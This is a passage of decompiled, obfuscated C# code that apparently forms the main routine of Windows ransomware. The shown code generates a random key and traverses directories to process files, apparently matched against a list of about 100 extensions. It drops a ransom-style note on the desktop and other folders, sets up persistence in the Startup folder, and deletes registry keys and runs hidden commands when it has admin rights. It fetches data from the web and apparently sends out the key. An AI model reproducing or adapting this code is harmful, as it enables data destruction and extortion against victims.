	public static string MVwpVRBXTVLjeLfX;

	public static string qCziuZEVIKv;

	public static string KyyvCOSpbyrlwCK;

	public static string FETefEWvHBDgcTp;

	public static string uGBVVDwnISiPvpGvAv;

	public static string NwLNnKNwbdzsgfZ;

	public static string tttsZxnASxs;

	public static string[] lgYFuyThGznQIqR;

	public static string VvpOdAIUVnqJzW;

	public static bool eccKoyYfSl;

	public static string rtXtlgTZIsNjmPPy;

	public static bool RoDeoCKBnUdhS;

	public static bool chtCsBAqNWxo;

	public static bool muPYedySMPaN;

	public static bool jptlurBjWWVRD;

	public static string nzrzeINFdi;

	public static bool zObGGMIceXoVAZ;

	public static bool kTLQhcVwfMsI;

	public static bool qsRYEskGecBwsdJu;

	public static bool ZqCAqHfWvbFF;

	public static bool TOGjrVUqPLyQO;

	public static string ORtBYtWybnrW;

	public static bool CsUrzcuJHIDFF;

	public static Stopwatch avGGySyKJADi;

	public static int ZKtLKJvwOV;

	public static int ECVrzbpNTQco;

	public static bool xPtaINcBZjHD;

	public static string tvMzMsATBRq;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegated;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate15;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate16;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		if (args.Length == 0 && loMcYZKWQQXGC == getString_0(107396770))
		{
			try
			{
				VRCyEzeZUIYroKza CS_0024_003C_003E8__locals0 = new VRCyEzeZUIYroKza();
				CS_0024_003C_003E8__locals0.IIQbRrCarJJrxLIc = Process.GetCurrentProcess().ProcessName;
				if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.IIQbRrCarJJrxLIc) > 1)
				{
					return;
				}
			}
			catch (Exception)
			{
			}
		}
		if (args.Length == 0 && loMcYZKWQQXGC == getString_0(107396770))
		{
			try
			{
				WBWuxeeaDKsQ.JqmInKzmcqxyb(taIcriAzbBhMzV);
			}
			catch (Exception)
			{
			}
		}
		try
		{
			if (FETefEWvHBDgcTp == getString_0(107396765))
			{
				Thread thread = new Thread(ISNvrVOHUsGI.dDYLHDOpCw);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (NZwBvHLOph == getString_0(107396765))
		{
			Thread.Sleep(int.Parse(RhKffUzShDrwT));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && WHGgQTjRlvqky == getString_0(107396765))
		{
			try
			{
				LRvcHQWmSn(KfBmpaPpRy(getString_0(107396728)));
			}
			catch
			{
			}
		}
		try
		{
			if (FPJcVMshPit == getString_0(107396765) && DdYZHHCQetpsQ.pNhcwZGiCRFCSc())
			{
				new jUuEbMgtQaePX().hOXwxuRwzcLLRuS(bool_0: false);
				DdYZHHCQetpsQ.sGICJtSrOaDelqgox();
			}
		}
		catch (Exception)
		{
		}
		if (LEnjOQhiZianv == getString_0(107396765) && DdYZHHCQetpsQ.pNhcwZGiCRFCSc())
		{
			new jUuEbMgtQaePX().hOXwxuRwzcLLRuS(bool_0: false);
			new jUuEbMgtQaePX().vFZDkcLwhbcA();
		}
		if (OnbGhlCpdM == getString_0(107396765))
		{
			RINZaKsMZBXLe.ETOjMTCHbDlnrm();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107397135);
			string text2 = text + Path.GetFileName(fileName);
			if (ehmLJtnXYxYzJ == getString_0(107396765) && fileName != text2)
			{
				Thread thread2 = new Thread(rDhjbtuEZRS);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (GcgKdRtBNfYo == getString_0(107396765) && mainModule != null && fileName != text2)
			{
				try
				{
					FHnNdGQfMfZLQ = shohnyVvwBqQf(0, gZeepLCxldrKjy.Count);
					File.Copy(fileName, text + gZeepLCxldrKjy[FHnNdGQfMfZLQ], overwrite: true);
					Process.Start(text + gZeepLCxldrKjy[FHnNdGQfMfZLQ]);
					StHhFdwZgorfORBp();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (OBiTPypEPPSaLg == getString_0(107396765) && DateTime.Now < NqbcwORJHgk)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (IFKuwcmSLwPIPe == getString_0(107396765) && DateTime.Now > fHNlylXjhwtg)
			{
				StHhFdwZgorfORBp();
			}
		}
		catch
		{
		}
		zEvfFDvaOTIYw();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegated == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegated = delegate
			{
				List<string> jKOJEVchMLNdwO = JKOJEVchMLNdwO;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
					{
						abIlhrbbxQowQH(getString_0(107392146), string_0);
					};
				}
				Parallel.ForEach(jKOJEVchMLNdwO, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				List<string> mnlfjMRAEDLqxPS = MnlfjMRAEDLqxPS;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
					{
						abIlhrbbxQowQH(getString_0(107392169), string_0);
					};
				}
				Parallel.ForEach(mnlfjMRAEDLqxPS, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				List<string> hEYpTuOcBu = HEYpTuOcBu;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						abIlhrbbxQowQH(KfBmpaPpRy(getString_0(107392156)), string_0);
					};
				}
				Parallel.ForEach(hEYpTuOcBu, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				if (tttsZxnASxs == getString_0(107396765))
				{
					string[] source = lgYFuyThGznQIqR;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
						{
							abIlhrbbxQowQH(KfBmpaPpRy(getString_0(107392156)), getString_0(107392131) + string_0 + getString_0(107392602));
						};
					}
					Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
				}
				if (!KqilAqOxbJnylCSb().Contains(getString_0(107392363)))
				{
					PdIlhbisPmBHZ(JrEMVbiIdsnWGMh);
				}
				else
				{
					List<string> pLOLJYWeMWGpM = PLOLJYWeMWGpM;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
						{
							abIlhrbbxQowQH(KfBmpaPpRy(oskmnSWYALtpc(getString_0(107392597))), string_0);
						};
					}
					Parallel.ForEach(pLOLJYWeMWGpM, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
				}
				List<string> tvdQhUAZHUpp = TvdQhUAZHUpp;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
					{
						abIlhrbbxQowQH(KfBmpaPpRy(getString_0(107392604)), string_0);
					};
				}
				Parallel.ForEach(tvdQhUAZHUpp, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
				List<string> source2 = jQsJEYgqnYfva;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
					{
						abIlhrbbxQowQH(getString_0(107392587), string_0);
					};
				}
				Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegated);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && muPYedySMPaN)
			{
				try
				{
					Thread thread4 = new Thread(uLOFjbzueS.LeBeZUyFkg);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			abIlhrbbxQowQH(getString_0(107397162), KfBmpaPpRy(getString_0(107397149)));
			abIlhrbbxQowQH(getString_0(107397162), KfBmpaPpRy(getString_0(107397044)));
			abIlhrbbxQowQH(KfBmpaPpRy(getString_0(107396987)), KfBmpaPpRy(getString_0(107396974)));
			abIlhrbbxQowQH(KfBmpaPpRy(getString_0(107396987)), KfBmpaPpRy(getString_0(107396332)));
		}
		SecureString secureString = new SecureString();
		if (xRGLBhsaFcrKl == getString_0(107396770))
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			cCZPkZyYefOPII = getString_0(107396222);
		}
		lhmVFsEfZqBVvrv = FSXOXhUgBZ.xjZeAJzrGxgor(yHvkDRQdQNFxDD(secureString));
		if (qsRYEskGecBwsdJu)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), ORtBYtWybnrW)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), ORtBYtWybnrW), string.Concat(KfBmpaPpRy(getString_0(107396657)), new WebClient().DownloadString(KfBmpaPpRy(getString_0(107396632))), getString_0(107396591), KfBmpaPpRy(getString_0(107396618)), DateTime.Now, getString_0(107396591), KfBmpaPpRy(getString_0(107396577)), lhmVFsEfZqBVvrv));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), ORtBYtWybnrW), getString_0(107396520) + lhmVFsEfZqBVvrv);
				}
			}
			catch (Exception ex7)
			{
				if (zObGGMIceXoVAZ)
				{
					try
					{
						File.AppendAllText(nzrzeINFdi, getString_0(107396491) + ex7.Message + getString_0(107396591));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		uUOPyKNnMHr.WKhUeANjSvKj(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), IYcsuWjlOhpGqM), nxdOmCYJoPU(lhmVFsEfZqBVvrv), null, null, getString_0(107395898), getString_0(107395913), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			RjBFaRPANuAeBY();
		}
		try
		{
			uxKbexEDJxt(new string[1] { getString_0(107395864) }, new string[100]
			{
				getString_0(107395855),
				getString_0(107395882),
				getString_0(107395877),
				getString_0(107395868),
				getString_0(107395831),
				getString_0(107395826),
				getString_0(107395821),
				getString_0(107395848),
				getString_0(107395843),
				getString_0(107395838),
				getString_0(107395801),
				getString_0(107395796),
				getString_0(107395819),
				getString_0(107395814),
				getString_0(107395805),
				getString_0(107395768),
				getString_0(107395763),
				getString_0(107395758),
				getString_0(107395785),
				getString_0(107395780),
				getString_0(107395739),
				getString_0(107395734),
				getString_0(107395729),
				getString_0(107395724),
				getString_0(107395751),
				getString_0(107395746),
				getString_0(107395741),
				getString_0(107395704),
				getString_0(107395699),
				getString_0(107395694),
				getString_0(107395721),
				getString_0(107395716),
				getString_0(107395711),
				getString_0(107396186),
				getString_0(107396177),
				getString_0(107396172),
				getString_0(107396199),
				getString_0(107396194),
				getString_0(107395821),
				getString_0(107396189),
				getString_0(107395843),
				getString_0(107396148),
				getString_0(107396143),
				getString_0(107396170),
				getString_0(107396165),
				getString_0(107396160),
				getString_0(107396123),
				getString_0(107396118),
				getString_0(107396113),
				getString_0(107396108),
				getString_0(107396135),
				getString_0(107396130),
				getString_0(107396125),
				getString_0(107396088),
				getString_0(107396083),
				getString_0(107396078),
				getString_0(107396105),
				getString_0(107396100),
				getString_0(107396059),
				getString_0(107396054),
				getString_0(107396045),
				getString_0(107396064),
				getString_0(107396189),
				getString_0(107396019),
				getString_0(107396042),
				getString_0(107396033),
				getString_0(107395992),
				getString_0(107395983),
				getString_0(107396006),
				getString_0(107396001),
				getString_0(107395960),
				getString_0(107395951),
				getString_0(107395974),
				getString_0(107395969),
				getString_0(107395964),
				getString_0(107395415),
				getString_0(107395410),
				getString_0(107395405),
				getString_0(107395432),
				getString_0(107395423),
				getString_0(107395386),
				getString_0(107395381),
				getString_0(107395376),
				getString_0(107395403),
				getString_0(107395398),
				getString_0(107395389),
				getString_0(107395348),
				getString_0(107395343),
				getString_0(107395711),
				getString_0(107395370),
				getString_0(107395365),
				getString_0(107395360),
				getString_0(107395323),
				getString_0(107395318),
				getString_0(107395309),
				getString_0(107395336),
				getString_0(107395331),
				getString_0(107395290),
				getString_0(107395285),
				getString_0(107395280)
			}, new string[0], yHvkDRQdQNFxDD(secureString), getString_0(107395307));
		}
		catch (Exception ex9)
		{
			if (zObGGMIceXoVAZ)
			{
				try
				{
					File.AppendAllText(nzrzeINFdi, getString_0(107395294) + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395269)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395269));
				streamWriter.WriteLine(KfBmpaPpRy(getString_0(107395236)));
				streamWriter.WriteLine(getString_0(107396591));
				streamWriter.WriteLine(KfBmpaPpRy(getString_0(107395590)));
				streamWriter.WriteLine(lhmVFsEfZqBVvrv);
				if (vRguZFjQqPE == getString_0(107396770))
				{
					streamWriter.WriteLine(getString_0(107396591));
					streamWriter.WriteLine(KfBmpaPpRy(getString_0(107395557)) + Convert.ToString(WBtfQTDigGvEr.Count));
				}
				if (xPtaINcBZjHD)
				{
					streamWriter.WriteLine(getString_0(107396591));
					streamWriter.WriteLine(KfBmpaPpRy(getString_0(107395448)));
					streamWriter.WriteLine(OtanrfhnzOcptTQBO.ZmCQYDHnCyhy());
				}
			}
			else
			{
				string text3 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395269));
				if (!text3.Contains(lhmVFsEfZqBVvrv) && !RoDeoCKBnUdhS)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395269), getString_0(107394903) + lhmVFsEfZqBVvrv);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in CarZQGMNGUm)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395269)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395269), item + getString_0(107395269), overwrite: true);
				}
				else
				{
					string text4 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395269));
					if (!text4.Contains(lhmVFsEfZqBVvrv) && !RoDeoCKBnUdhS)
					{
						File.AppendAllText(item + getString_0(107395269), getString_0(107394903) + lhmVFsEfZqBVvrv);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!jptlurBjWWVRD && num > 10)
			{
				break;
			}
		}
		if (MVwpVRBXTVLjeLfX == getString_0(107396765))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394874)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394874));
					streamWriter2.WriteLine(KfBmpaPpRy(getString_0(107394841)));
					streamWriter2.WriteLine(getString_0(107396591));
					streamWriter2.WriteLine(KfBmpaPpRy(getString_0(107394856)));
					streamWriter2.WriteLine(lhmVFsEfZqBVvrv + KfBmpaPpRy(getString_0(107394735)));
					if (vRguZFjQqPE == getString_0(107396770))
					{
						streamWriter2.WriteLine(getString_0(107396591));
						streamWriter2.WriteLine(KfBmpaPpRy(getString_0(107394754)) + KfBmpaPpRy(getString_0(107395557)) + Convert.ToString(WBtfQTDigGvEr.Count) + KfBmpaPpRy(getString_0(107394735)));
					}
					if (xPtaINcBZjHD)
					{
						streamWriter2.WriteLine(getString_0(107396591));
						streamWriter2.WriteLine(KfBmpaPpRy(getString_0(107395448)));
						streamWriter2.WriteLine(OtanrfhnzOcptTQBO.ZmCQYDHnCyhy());
					}
				}
				else
				{
					string text5 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395269));
					if (!text5.Contains(lhmVFsEfZqBVvrv) && !RoDeoCKBnUdhS)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394874), KfBmpaPpRy(getString_0(107394754)) + getString_0(107394903) + lhmVFsEfZqBVvrv + KfBmpaPpRy(getString_0(107394735)));
					}
				}
			}
			catch
			{
			}
		}
		if (olfcnDyKkIf == getString_0(107396765))
		{
			try
			{
				if (vRguZFjQqPE == getString_0(107396770))
				{
					OtanrfhnzOcptTQBO.kofdKDbeRaOR(getString_0(107394693), getString_0(107394688), getString_0(107395155), string.Concat(KfBmpaPpRy(getString_0(107396657)), new WebClient().DownloadString(KfBmpaPpRy(getString_0(107396632))), getString_0(107395178), KfBmpaPpRy(getString_0(107396618)), DateTime.Now, getString_0(107396591), KfBmpaPpRy(getString_0(107395173)), Convert.ToString(WBtfQTDigGvEr.Count), getString_0(107396591), KfBmpaPpRy(getString_0(107396577)), lhmVFsEfZqBVvrv));
				}
				else
				{
					OtanrfhnzOcptTQBO.kofdKDbeRaOR(getString_0(107394693), getString_0(107394688), getString_0(107395155), string.Concat(KfBmpaPpRy(getString_0(107396657)), new WebClient().DownloadString(KfBmpaPpRy(getString_0(107396632))), getString_0(107395178), KfBmpaPpRy(getString_0(107396618)), DateTime.Now, getString_0(107396591), KfBmpaPpRy(getString_0(107395173)), Convert.ToString(WBtfQTDigGvEr.Count), getString_0(107396591), KfBmpaPpRy(getString_0(107396577)), lhmVFsEfZqBVvrv));
				}
			}
			catch
			{
			}
		}
		if (ezaaqHOMpUba == getString_0(107396765))
		{
			try
			{
				ZnXigQOJzYjHo.IQXtEobeZBt(new Uri(getString_0(107395092)));
			}
			catch
			{
			}
		}
		if (MVwpVRBXTVLjeLfX == getString_0(107396770))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395269)))
				{
					Process.Start(KfBmpaPpRy(getString_0(107395091)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395269));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394874)))
				{
					Process.Start(KfBmpaPpRy(getString_0(107395066)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394874));
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(NDMXRGcShGOYi))
		{
			try
			{
				File.Delete(NDMXRGcShGOYi);
			}
			catch
			{
			}
		}
		if (zObGGMIceXoVAZ)
		{
			try
			{
				File.AppendAllText(nzrzeINFdi, getString_0(107395081));
			}
			catch (Exception)
			{
			}
		}
		if (uWFvpRMRVQI == getString_0(107395068))
		{
			StHhFdwZgorfORBp();
		}
	}

	public static void rDhjbtuEZRS()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(KfBmpaPpRy(getString_0(107395027)), KfBmpaPpRy(getString_0(107394361)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int shohnyVvwBqQf(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> yeZMoafCBlpRLv(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107394376)) && !text.Contains(getString_0(107394319)) && !text.Contains(getString_0(107394286)) && !text.ToLower().Contains(getString_0(107394301)) && !text.ToLower().Contains(getString_0(107394256)) && !text.Contains(getString_0(107394231)) && !text.Contains(getString_0(107394242)) && !text.ToLower().Contains(getString_0(107394193)) && !text.ToLower().Contains(getString_0(107394212)) && !text.ToLower().Contains(getString_0(107394175)) && !text.ToLower().Contains(getString_0(107394646)) && !text.ToLower().Contains(getString_0(107394661)) && !text.ToLower().Contains(getString_0(107394616)) && !text.ToLower().Contains(getString_0(107394635)) && !text.ToLower().Contains(getString_0(107394582)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107394589)) && !fileInfo.FullName.Contains(getString_0(107394540)) && !fileInfo.FullName.Contains(getString_0(107394523)) && !fileInfo.FullName.Contains(getString_0(107394538)) && !fileInfo.FullName.Contains(getString_0(107394489)) && !fileInfo.FullName.Contains(getString_0(107394504)) && !fileInfo.FullName.Contains(getString_0(107394455)) && !fileInfo.FullName.Contains(getString_0(107394470)) && !fileInfo.FullName.Contains(getString_0(107394425)) && !fileInfo.FullName.Contains(getString_0(107394436)) && !fileInfo.FullName.ToLower().Contains(getString_0(107393879)) && !fileInfo.FullName.ToLower().Contains(getString_0(107393898)) && !fileInfo.FullName.ToLower().Contains(getString_0(107393849)) && !fileInfo.FullName.ToLower().Contains(getString_0(107393864)) && !fileInfo.FullName.Contains(KfBmpaPpRy(getString_0(107393815))) && !fileInfo.FullName.Contains(getString_0(107393822)) && !fileInfo.FullName.Contains(getString_0(107393777)) && !fileInfo.FullName.Contains(getString_0(107393792)) && !fileInfo.FullName.EndsWith(getString_0(107395307)) && !fileInfo.FullName.EndsWith(getString_0(107393767)) && !fileInfo.FullName.EndsWith(getString_0(107393762)) && !fileInfo.FullName.EndsWith(getString_0(107393757)) && !fileInfo.FullName.EndsWith(getString_0(107393720)) && !fileInfo.FullName.Contains(getString_0(107393715)) && !fileInfo.FullName.Contains(IYcsuWjlOhpGqM) && !fileInfo.FullName.Contains(nzrzeINFdi) && !fileInfo.FullName.Contains(ORtBYtWybnrW))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(MOZyLSAyVmBVtUMu) * 1024.0 * 1024.0 && mHhRadxeyhbcW == getString_0(107396765))
						{
							list.Add(fileInfo.FullName);
							UWZimtrDaOxqycE(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && mHhRadxeyhbcW == getString_0(107396770))
						{
							list.Add(fileInfo.FullName);
							UWZimtrDaOxqycE(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static string abIlhrbbxQowQH(string qhHVzOTYyM = "", string asFuhwMpzeI = "")
	{
		string result = getString_0(107395092);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = qhHVzOTYyM,
				Arguments = asFuhwMpzeI,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void LRvcHQWmSn(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107393730),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string oskmnSWYALtpc(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string KfBmpaPpRy(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void PdIlhbisPmBHZ(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = KfBmpaPpRy(getString_0(107393681));
		processStartInfo.Arguments = getString_0(107393652) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool PfklXCmYiYi(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string yHvkDRQdQNFxDD(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void zEvfFDvaOTIYw()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = oskmnSWYALtpc(getString_0(107393647));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(KfBmpaPpRy(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(KfBmpaPpRy(getString_0(107394053)));
					registryKey.DeleteSubKey(KfBmpaPpRy(getString_0(107393996)));
					registryKey.DeleteSubKey(KfBmpaPpRy(getString_0(107393979)));
					registryKey.DeleteSubKey(KfBmpaPpRy(getString_0(107393986)));
					registryKey.DeleteSubKey(KfBmpaPpRy(getString_0(107393681)));
					registryKey.DeleteSubKey(KfBmpaPpRy(getString_0(107393961)));
					registryKey.DeleteSubKey(KfBmpaPpRy(getString_0(107393900)));
					registryKey.Close();
				}
				string_ = oskmnSWYALtpc(getString_0(107393371));
				registryKey = Registry.LocalMachine.OpenSubKey(KfBmpaPpRy(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(KfBmpaPpRy(getString_0(107393274)));
					registryKey.Close();
				}
				string_ = oskmnSWYALtpc(getString_0(107393289));
				registryKey = Registry.LocalMachine.OpenSubKey(KfBmpaPpRy(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(KfBmpaPpRy(getString_0(107393274)));
					registryKey.Close();
				}
				string_ = oskmnSWYALtpc(getString_0(107393289));
				registryKey = Registry.CurrentUser.OpenSubKey(KfBmpaPpRy(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(KfBmpaPpRy(getString_0(107393274)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			abIlhrbbxQowQH(KfBmpaPpRy(getString_0(107393240)), KfBmpaPpRy(getString_0(107393255)));
			abIlhrbbxQowQH(KfBmpaPpRy(getString_0(107393174)), KfBmpaPpRy(getString_0(107393165)));
			abIlhrbbxQowQH(KfBmpaPpRy(getString_0(107393174)), KfBmpaPpRy(getString_0(107393531)));
			abIlhrbbxQowQH(KfBmpaPpRy(getString_0(107393502)), KfBmpaPpRy(getString_0(107393453)));
		}
		catch
		{
		}
	}

	public static void NebQHReckdpj(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(KfBmpaPpRy(getString_0(107393412)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
